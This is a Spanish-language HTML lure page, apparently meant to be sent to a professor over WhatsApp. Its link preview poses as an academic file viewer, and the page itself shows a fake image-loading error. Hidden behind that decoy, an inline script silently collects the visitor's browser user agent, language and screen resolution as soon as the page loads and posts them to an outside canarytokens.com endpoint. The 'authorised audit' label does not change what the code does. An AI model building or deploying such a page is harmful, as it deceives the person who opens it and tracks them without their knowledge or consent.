<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <!-- Meta etiquetas Open Graph para que WhatsApp dibuje la tarjeta inicial -->
    <meta property="og:title" content="Visualizador de Archivos Académico" />
    <meta property="og:description" content="Entorno de Auditoría Autorizado - Proyecto Examen Final" />
    <meta property="og:image" content="https://picsum.photos" /> 
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image" />

    <title>Error de carga - Servidor</title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#121212; display:flex; flex-direction:column; justify-content:center; align-items:center; color:#a0a0a0; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow:hidden; text-align:center; }
        .error-icon { font-size: 56px; margin-bottom: 15px; color: #d32f2f; }
        .error-title { font-size: 18px; font-weight: bold; color: #e0e0e0; margin-bottom: 8px; }
        .error-desc { font-size: 14px; width: 85%; max-width: 400px; line-height: 1.4; color: #888; }
    </style>
</head>
<body>

    <!-- Tu profesor verá este fallo técnico realista en su pantalla -->
    <div class="error-icon">⚠️</div>
    <div class="error-title">Error al cargar la imagen</div>
    <div class="error-desc">El recurso multimedia temporal no está disponible o ha expirado. Por favor, vuelve a intentarlo más tarde o comprueba tu conexión a internet.</div>

    <script>
        // Captura silenciosa de la telemetría del navegador
        const datosExamen = {
            agente: navigator.userAgent,
            idioma: navigator.language,
            resolucion: `${window.screen.width}x${window.screen.height}`
        };

        // Tu enlace real transmitiendo en segundo plano de forma inmediata
        fetch("https://canarytokens.com", {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify(datosExamen)
        });
    </script>
</body>
</html>
